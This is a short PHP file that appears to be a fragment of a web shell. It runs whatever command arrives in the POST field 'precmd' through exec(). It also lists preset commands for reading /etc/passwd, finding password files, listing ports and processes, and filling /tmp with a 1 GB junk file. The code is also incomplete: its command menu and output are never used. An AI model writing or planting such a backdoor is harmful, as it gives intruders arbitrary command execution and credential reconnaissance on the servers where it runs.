<?php
function cmd(){ // Command execution function
	$precmd = array(''=>'','Read /etc/passwd'=>'cat /etc/passwd','Open ports'=>'netstat -an',
	'Running Processes'=>'ps -aux', 'Uname'=>'uname -a', 'Get UID'=>'id',
	'Create Junkfile (/tmp/z)'=>'dd if=/dev/zero of=/tmp/z bs=1M count=1024',
	'Find passwd files'=>'find / -type f -name passwd');
	
	$x = $_POST['precmd'];	

	$cmd = @exec($x, $result);
	
	echo("</textarea>");
}

call_user_func('cmd');
?>